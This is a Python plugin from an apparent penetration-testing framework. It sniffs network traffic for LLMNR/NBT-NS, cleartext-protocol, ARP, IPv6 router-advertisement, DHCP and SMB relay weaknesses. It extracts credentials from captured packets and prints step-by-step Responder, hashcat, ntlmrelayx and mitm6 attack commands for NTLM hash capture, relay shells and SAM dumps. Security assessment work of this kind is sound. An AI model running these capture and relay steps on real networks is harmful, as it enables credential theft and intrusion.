"""
plugins/traffic.py — Network Traffic Analysis & Packet Capture Module

Purpose: Passive and active network traffic analysis for authorized
assessments. Identifies cleartext credentials, sensitive data in
transit, protocol misconfigurations, and network anomalies.

Techniques:
  1.  Passive packet capture (pcap) on authorized interfaces
  2.  Cleartext credential detection (HTTP, FTP, Telnet, SMTP, POP3)
  3.  ARP poisoning detection (duplicate MAC/IP)
  4.  Network topology mapping from live traffic
  5.  SSL stripping / HTTP downgrade detection
  6.  DNS query analysis for C2/tunnel indicators
  7.  LLMNR/NBT-NS poisoning vulnerability check
  8.  IPv6 RA spoofing vulnerability check
  9.  DHCP starvation and rogue DHCP detection
  10. SMB relay attack surface (NBT-NS, LLMNR exposure)
  11. Broadcast storm / network noise detection
  12. Sensitive protocol detection (Telnet, FTP, SNMPv1/v2)
  13. NetFlow / traffic statistics summary
  14. Host discovery via passive ARP monitoring
"""

import re
import os
import time
from core.banner import print_status, print_finding, print_table, print_section, C
from utils.shell import run_cmd, cmd_exists, is_root


def run(args, verbose=False):
    results  = {}
    iface    = getattr(args, "interface", _get_default_iface())
    duration = int(getattr(args, "duration", 15))

    print_status(f"Traffic analysis on interface: {iface} (duration: {duration}s)", "info")
    print_status("[!] Requires root and authorized network segment.", "warn")

    _check_prerequisites(results, iface, verbose)
    _passive_host_discovery(results, iface, duration, verbose)
    _llmnr_nbtns_check(results, iface, verbose)
    _cleartext_proto_check(results, iface, verbose)
    _arp_poisoning_detection(results, iface, verbose)
    _ipv6_ra_check(results, iface, verbose)
    _dhcp_rogue_check(results, iface, verbose)
    _smb_relay_surface(results, iface, verbose)
    _sensitive_data_sniff(results, iface, duration, verbose)
    _responder_guidance(results, iface, verbose)

    return results


# ── Utilities ─────────────────────────────────────────────────────────────────

def _get_default_iface():
    rc, out = run_cmd("ip route | grep default | awk '{print $5}' | head -1", timeout=4)
    return out.strip() or "eth0"


def _check_prerequisites(results, iface, verbose):
    print_section("  PREREQUISITES CHECK  ")

    prereqs = {
        "tcpdump":   cmd_exists("tcpdump"),
        "tshark":    cmd_exists("tshark"),
        "nmap":      cmd_exists("nmap"),
        "responder": cmd_exists("responder") or os.path.exists("/usr/share/responder/Responder.py"),
        "root":      is_root(),
    }
    results["prereqs"] = prereqs
    rows = [(k, "✓" if v else "✗") for k, v in prereqs.items()]
    print_table(["Tool/Permission", "Available"], rows)

    missing = [k for k, v in prereqs.items() if not v and k != "root"]
    if missing:
        print_status(f"Install missing: apt install {' '.join(missing)}", "warn")
    if not prereqs["root"]:
        print_status("Root required for packet capture and interface monitoring.", "warn")


# ── Passive Host Discovery ────────────────────────────────────────────────────

def _passive_host_discovery(results, iface, duration, verbose):
    print_section("  PASSIVE HOST DISCOVERY  ")
    print_status(f"Monitoring ARP traffic for {duration}s…", "info")

    if not cmd_exists("tcpdump"):
        print_status("tcpdump not available.", "warn")
        results["passive_hosts"] = []
        return

    rc, arp_out = run_cmd(
        f"timeout {duration} tcpdump -i {iface} -n arp 2>/dev/null | head -50",
        timeout=duration + 5
    )

    discovered = {}
    for line in arp_out.splitlines():
        # ARP who-has / is-at patterns
        m1 = re.search(r'ARP, Request who-has ([\d.]+) tell ([\d.]+)', line)
        m2 = re.search(r'ARP, Reply ([\d.]+) is-at ([0-9a-f:]{17})', line, re.IGNORECASE)
        if m1:
            discovered.setdefault(m1.group(2), {"ip": m1.group(2), "mac": "?"})
        if m2:
            discovered[m2.group(1)] = {"ip": m2.group(1), "mac": m2.group(2)}

    hosts = list(discovered.values())
    results["passive_hosts"] = hosts
    if hosts:
        print_status(f"Hosts discovered passively: {len(hosts)}", "info")
        print_table(["IP", "MAC"], [(h["ip"], h["mac"]) for h in hosts[:20]])
    else:
        print_status("No ARP traffic observed in capture window.", "miss")


# ── LLMNR / NBT-NS Poisoning Surface ─────────────────────────────────────────

def _llmnr_nbtns_check(results, iface, verbose):
    print_section("  LLMNR / NBT-NS POISONING SURFACE  ")
    issues = []

    # Check if LLMNR is active (multicast 224.0.0.252:5355)
    rc, llmnr = run_cmd(
        f"timeout 8 tcpdump -i {iface} -n 'udp port 5355' 2>/dev/null | head -5",
        timeout=12
    )
    if llmnr.strip():
        issues.append({
            "protocol": "LLMNR",
            "port":     "UDP 5355",
            "detail":   "LLMNR traffic detected — Responder poisoning possible",
            "severity": "critical"
        })

    # NBT-NS (UDP 137)
    rc2, nbtns = run_cmd(
        f"timeout 8 tcpdump -i {iface} -n 'udp port 137' 2>/dev/null | head -5",
        timeout=12
    )
    if nbtns.strip():
        issues.append({
            "protocol": "NBT-NS",
            "port":     "UDP 137",
            "detail":   "NBT-NS traffic detected — Responder poisoning possible",
            "severity": "critical"
        })

    # mDNS (UDP 5353)
    rc3, mdns = run_cmd(
        f"timeout 5 tcpdump -i {iface} -n 'udp port 5353' 2>/dev/null | head -5",
        timeout=8
    )
    if mdns.strip():
        issues.append({
            "protocol": "mDNS",
            "port":     "UDP 5353",
            "detail":   "mDNS traffic — Apple Bonjour/Avahi poisoning possible",
            "severity": "high"
        })

    # System check: is LLMNR enabled locally?
    rc4, systemd_res = run_cmd(
        "grep -r 'LLMNR' /etc/systemd/resolved.conf 2>/dev/null",
        timeout=5
    )
    if "yes" in systemd_res.lower() or not systemd_res.strip():
        issues.append({
            "protocol": "LLMNR (local)",
            "port":     "systemd-resolved",
            "detail":   "Local LLMNR not explicitly disabled",
            "severity": "medium"
        })

    results["llmnr_nbtns"] = issues
    if issues:
        print_finding(
            f"Name Resolution Poisoning Surface ({len(issues)} protocol(s))",
            "\n".join(f"  [{i['severity'].upper()}] {i['protocol']}: {i['detail']}"
                      for i in issues),
            "critical"
        )
        print(f"\n  {C.CYAN}Responder Attack (authorized test):{C.RESET}")
        print(f"  {C.DIM}  sudo responder -I {iface} -wPv{C.RESET}")
        print(f"  {C.DIM}  # Captures NTLMv2 hashes → crack with hashcat -m 5600{C.RESET}\n")
    else:
        print_status("No LLMNR/NBT-NS/mDNS traffic detected.", "miss")


# ── Cleartext Protocol Detection ──────────────────────────────────────────────

def _cleartext_proto_check(results, iface, verbose):
    print_section("  CLEARTEXT PROTOCOL DETECTION  ")

    cleartext_protos = {
        "FTP":    "tcp port 21",
        "Telnet": "tcp port 23",
        "HTTP":   "tcp port 80",
        "SMTP":   "tcp port 25",
        "POP3":   "tcp port 110",
        "IMAP":   "tcp port 143",
        "SNMP":   "udp port 161",
        "LDAP":   "tcp port 389",
        "RDP":    "tcp port 3389",
    }

    active = []
    if cmd_exists("tcpdump"):
        for proto, bpf in cleartext_protos.items():
            rc, out = run_cmd(
                f"timeout 5 tcpdump -i {iface} -n '{bpf}' 2>/dev/null | head -3",
                timeout=8
            )
            if out.strip():
                count = len(out.strip().splitlines())
                active.append((proto, bpf.split()[-1], f"{count} packets seen"))

    results["cleartext_protos"] = active
    if active:
        print_finding(
            f"Cleartext Protocols Active ({len(active)})",
            "\n".join(f"  [HIGH] {p[0]} (port {p[1]}): {p[2]}" for p in active),
            "high"
        )
    else:
        print_status("No cleartext protocol traffic detected in window.", "miss")


# ── ARP Poisoning Detection ───────────────────────────────────────────────────

def _arp_poisoning_detection(results, iface, verbose):
    print_section("  ARP POISONING / SPOOFING DETECTION  ")

    rc, arp_cache = run_cmd("arp -a -n 2>/dev/null", timeout=6)
    # Look for duplicate MACs with different IPs
    mac_to_ips: dict = {}
    for line in arp_cache.splitlines():
        m = re.search(r'\((\S+)\)\s+at\s+([0-9a-f:]{17})', line, re.IGNORECASE)
        if m:
            ip, mac = m.group(1), m.group(2).lower()
            mac_to_ips.setdefault(mac, []).append(ip)

    # Duplicate IPs for same MAC = ARP poisoning indicator
    spoofs = [(mac, ips) for mac, ips in mac_to_ips.items() if len(ips) > 1]
    # Check for gateway IP with unexpected MAC changes
    rc2, gw = run_cmd("ip route | grep default | awk '{print $3}' | head -1", timeout=4)
    gw_ip   = gw.strip()

    results["arp_spoofing"] = spoofs
    if spoofs:
        print_finding(
            f"Potential ARP Spoofing Detected ({len(spoofs)} MAC(s) with multiple IPs)",
            "\n".join(f"  [CRITICAL] MAC {s[0]} → IPs: {', '.join(s[1])}" for s in spoofs),
            "critical"
        )
    else:
        print_status("ARP cache looks clean (no duplicate MAC entries).", "miss")

    # Dynamic ARP monitoring for 5s
    if cmd_exists("tcpdump"):
        rc3, live_arp = run_cmd(
            f"timeout 5 tcpdump -i {iface} -n arp 2>/dev/null | grep 'is-at' | head -10",
            timeout=8
        )
        gratuitous = [l for l in live_arp.splitlines()
                      if "Gratuitous" in l or re.search(r'(\S+) is-at.*\1', l)]
        if gratuitous:
            print_finding("Gratuitous ARP Detected (possible poisoning in progress)",
                          "\n".join(f"  {l}" for l in gratuitous),
                          "critical")


# ── IPv6 RA Spoofing Check ────────────────────────────────────────────────────

def _ipv6_ra_check(results, iface, verbose):
    print_section("  IPv6 ROUTER ADVERTISEMENT SPOOFING CHECK  ")

    rc, ra_out = run_cmd(
        f"timeout 8 tcpdump -i {iface} -n 'icmp6 and ip6[40] == 134' 2>/dev/null | head -5",
        timeout=12
    )
    rc2, ipv6_ifaces = run_cmd("ip -6 addr show 2>/dev/null | grep 'inet6'", timeout=5)

    issues = []
    if ra_out.strip():
        issues.append("IPv6 Router Advertisements detected — rogue RA spoofing possible")

    if ipv6_ifaces.strip():
        # Check if RA guard is configured
        rc3, ra_guard = run_cmd(
            "sysctl net.ipv6.conf.all.accept_ra 2>/dev/null",
            timeout=4
        )
        if "= 1" in ra_guard:
            issues.append("accept_ra=1: Host accepts IPv6 RAs — mitm6 attack possible")

    results["ipv6_ra"] = issues
    if issues:
        print_finding("IPv6 RA Spoofing Surface",
                      "\n".join(f"  [HIGH] {i}" for i in issues),
                      "high")
        print(f"  {C.DIM}  Tool: mitm6 -i {iface} -d domain.local{C.RESET}\n")
    else:
        print_status("No IPv6 RA spoofing indicators found.", "miss")


# ── DHCP Rogue Check ──────────────────────────────────────────────────────────

def _dhcp_rogue_check(results, iface, verbose):
    print_section("  ROGUE DHCP DETECTION  ")

    if not cmd_exists("tcpdump"):
        results["dhcp"] = []
        return

    rc, dhcp_out = run_cmd(
        f"timeout 8 tcpdump -i {iface} -n 'udp port 67 or udp port 68' 2>/dev/null | head -10",
        timeout=12
    )

    dhcp_servers = set()
    for line in dhcp_out.splitlines():
        # DHCP OFFER/ACK from server
        if "DHCP" in line and "Offer" in line or "ACK" in line:
            m = re.search(r'(\d+\.\d+\.\d+\.\d+).*DHCP', line)
            if m:
                dhcp_servers.add(m.group(1))

    results["dhcp_servers"] = list(dhcp_servers)
    if len(dhcp_servers) > 1:
        print_finding(
            f"Multiple DHCP Servers Detected ({len(dhcp_servers)})",
            "\n".join(f"  {s}" for s in dhcp_servers),
            "high"
        )
    elif dhcp_servers:
        print_status(f"DHCP server: {list(dhcp_servers)[0]}", "miss")
    else:
        print_status("No DHCP traffic observed.", "miss")


# ── SMB Relay Attack Surface ──────────────────────────────────────────────────

def _smb_relay_surface(results, iface, verbose):
    print_section("  SMB RELAY ATTACK SURFACE  ")

    rc, smb_traffic = run_cmd(
        f"timeout 8 tcpdump -i {iface} -n 'port 445 or port 139' 2>/dev/null | head -10",
        timeout=12
    )

    smb_hosts = set()
    for line in smb_traffic.splitlines():
        ips = re.findall(r'(\d+\.\d+\.\d+\.\d+)\.(?:445|139)', line)
        smb_hosts.update(ips)

    results["smb_hosts"] = list(smb_hosts)

    if smb_hosts:
        print_finding(
            f"SMB Traffic Detected — Relay Attack Surface ({len(smb_hosts)} host(s))",
            "\n".join(f"  {h}" for h in smb_hosts),
            "high"
        )
        print(f"\n  {C.CYAN}SMB Relay Attack (authorized test — requires LLMNR/NBT-NS active):{C.RESET}")
        print(f"  {C.DIM}  # Step 1: Disable SMB/HTTP in Responder.conf, then:")
        print(f"  sudo responder -I {iface} -wPv")
        print(f"  # Step 2: Relay to targets (without SMB signing):")
        print(f"  sudo impacket-ntlmrelayx -tf smb_targets.txt -smb2support")
        print(f"  # Step 3: Shell or SAM dump from relayed auth{C.RESET}\n")


# ── Sensitive Data Sniffing ────────────────────────────────────────────────────

def _sensitive_data_sniff(results, iface, duration, verbose):
    print_section("  SENSITIVE DATA IN TRANSIT  ")
    print_status(f"Capturing {duration}s of traffic for sensitive data analysis…", "info")

    if not cmd_exists("tcpdump"):
        results["sensitive_traffic"] = []
        return

    # Capture to temp file
    cap_file = "/tmp/phantomx_cap.pcap"
    run_cmd(
        f"timeout {duration} tcpdump -i {iface} -w {cap_file} "
        f"-n 'tcp port 21 or tcp port 23 or tcp port 80 or tcp port 110 or tcp port 143' "
        f"2>/dev/null",
        timeout=duration + 3
    )

    findings = []
    if os.path.exists(cap_file) and cmd_exists("strings"):
        rc, strings_out = run_cmd(f"strings {cap_file} 2>/dev/null | head -200", timeout=8)
        cred_patterns = [
            (r'(?i)user(?:name)?[=: ]+(\S+)', "Username"),
            (r'(?i)pass(?:word)?[=: ]+(\S+)', "Password"),
            (r'(?i)Authorization:\s*Basic\s+(\S+)', "HTTP Basic Auth"),
            (r'(?i)PASS\s+(\S+)', "FTP/POP3 Password"),
            (r'(?i)USER\s+(\S+)', "FTP/POP3 Username"),
        ]
        for pattern, label in cred_patterns:
            for m in re.finditer(pattern, strings_out):
                val = m.group(1)[:30]
                if len(val) > 2 and val not in ("null","undefined","*"):
                    findings.append((label, val))

        try:
            os.unlink(cap_file)
        except Exception:
            pass

    results["sensitive_traffic"] = findings
    if findings:
        print_finding(
            f"Sensitive Data in Network Traffic ({len(findings)} item(s))",
            "\n".join(f"  [CRITICAL] {f[0]}: {f[1]}" for f in findings[:10]),
            "critical"
        )
    else:
        print_status("No obvious credentials in captured traffic.", "miss")


# ── Responder Guidance ────────────────────────────────────────────────────────

def _responder_guidance(results, iface, verbose):
    print_section("  RESPONDER / INVEIGH ATTACK GUIDE  ")

    llmnr_active = bool(results.get("llmnr_nbtns"))

    if llmnr_active:
        print_finding(
            "LLMNR/NBT-NS Poisoning Conditions Met",
            "  Network is vulnerable to credential capture attacks.", "critical"
        )

    print(f"\n  {C.CYAN}{C.BOLD}Responder Attack Workflow (authorized assessment):{C.RESET}\n")
    steps = [
        ("1. Launch Responder (capture NTLMv2 hashes)",
         f"sudo responder -I {iface} -wPbv"),
        ("2. Crack captured hashes",
         "hashcat -m 5600 Responder/logs/*.txt /usr/share/wordlists/rockyou.txt"),
        ("3. NTLM Relay (if signing not required)",
         "sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i"),
        ("4. Interactive SMB shell via relay",
         "nc 127.0.0.1 11000  # after ntlmrelayx -i"),
        ("5. Dump SAM via relay",
         "sudo impacket-ntlmrelayx -tf targets.txt -smb2support"),
        ("6. IPv6 + mitm6 + relay (most effective against AD)",
         f"sudo mitm6 -i {iface} -d domain.local\n"
         "  sudo impacket-ntlmrelayx -6 -tf targets.txt -smb2support -wh attacker-wpad"),
    ]
    for label, cmd in steps:
        print(f"  {C.YELLOW}▸ {label}{C.RESET}")
        for line in cmd.splitlines():
            print(f"    {C.GREEN}$ {line.strip()}{C.RESET}")
        print()
